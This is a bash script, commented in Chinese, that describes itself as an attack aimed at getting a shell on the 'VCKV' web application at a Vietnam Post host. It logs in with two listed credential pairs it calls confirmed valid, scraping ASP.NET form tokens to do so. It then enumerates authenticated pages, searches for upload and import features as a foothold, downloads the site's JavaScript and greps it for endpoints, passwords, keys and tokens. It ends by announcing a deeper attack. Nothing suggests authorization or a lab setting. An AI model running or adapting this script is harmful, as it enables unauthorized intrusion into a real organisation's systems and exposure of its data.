#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 转向攻击：VCKV系统全面GetShell"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "✅ 已确认有效账号:"
echo "  1. nvdh:123456"
echo "  2. vckvdbb:abc123"
echo ""
echo "🎯 攻击目标: http://vps.vnpost.vn/vckv/"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Phase 1: 登录并完整功能枚举"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

BASE="http://vps.vnpost.vn/vckv"

# 账号1: nvdh:123456
echo ""
echo "[账号1] nvdh:123456"
echo "  登录中..."

# 获取登录页面和ViewState
login_page=$(curl -sk "${BASE}/Login.aspx" 2>&1)
VS=$(echo "$login_page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$login_page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$login_page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# 执行登录
login_resp=$(curl -sk "${BASE}/Login.aspx" \
    -X POST \
    -c cookie_nvdh.txt \
    --data-urlencode "__VIEWSTATE=$VS" \
    --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
    --data-urlencode "__EVENTVALIDATION=$EV" \
    --data-urlencode "txtUsername=nvdh" \
    --data-urlencode "txtPassword=123456" \
    --data-urlencode "btnLogin=Login" \
    -L 2>&1)

# 检查登录状态
if echo "$login_resp" | grep -qi "logout\|dashboard\|welcome\|admin"; then
    echo "  ✅ 登录成功！"
    
    # 获取主页
    echo "  获取主页..."
    curl -sk "${BASE}/Default.aspx" \
        -b cookie_nvdh.txt \
        -o nvdh_homepage.html 2>&1
    
    echo "  主页大小: $(wc -c < nvdh_homepage.html) bytes"
    
    # 提取所有链接
    echo "  提取所有功能链接..."
    grep -hoE 'href="[^"]+\.aspx[^"]*"' nvdh_homepage.html | \
        sed 's/href="//g' | sed 's/"//g' | sort -u > nvdh_all_links.txt
    
    echo "  发现 $(wc -l < nvdh_all_links.txt) 个链接"
    cat nvdh_all_links.txt
    
else
    echo "  ❌ 登录失败"
    echo "$login_resp" | head -50
fi

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Phase 2: 寻找文件上传/导入功能"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 高价值关键词
UPLOAD_KEYWORDS=("upload" "import" "attach" "file" "excel" "export" "backup")

echo "  搜索上传/导入功能..."
for keyword in "${UPLOAD_KEYWORDS[@]}"; do
    grep -i "$keyword" nvdh_all_links.txt | while read link; do
        echo "  🔥 发现: $link"
    done
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Phase 3: JS逆向分析"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 提取所有JS文件
echo "  提取JS文件..."
grep -hoE '(src|href)="[^"]+\.js[^"]*"' nvdh_homepage.html | \
    sed 's/.*=["'\'']//' | sed 's/["'\'']//' | sort -u > vckv_js_files.txt

mkdir -p js_files

echo "  下载JS文件..."
while read js_url; do
    if [[ $js_url == http* ]]; then
        full_url="$js_url"
    elif [[ $js_url == /* ]]; then
        full_url="http://vps.vnpost.vn${js_url}"
    else
        full_url="${BASE}/${js_url}"
    fi
    
    filename=$(echo "$full_url" | md5sum | cut -d' ' -f1).js
    echo "    $full_url"
    curl -sk "$full_url" -o "js_files/${filename}" 2>&1
done < vckv_js_files.txt

# 分析JS
echo ""
echo "  分析JS中的API端点..."
grep -hoE "(https?://[^\"']+|/[a-zA-Z0-9/_\.-]+\.aspx[^\"'<> ]*)" js_files/*.js 2>/dev/null | \
    sort -u > vckv_api_endpoints.txt

echo "  发现 $(wc -l < vckv_api_endpoints.txt) 个API端点"
head -20 vckv_api_endpoints.txt

echo ""
echo "  查找敏感信息..."
grep -iE "(password|key|secret|token|upload)" js_files/*.js 2>/dev/null | \
    grep -v "function\|var\|//" | head -20

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ Phase 1-3 完成，开始深度攻击..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
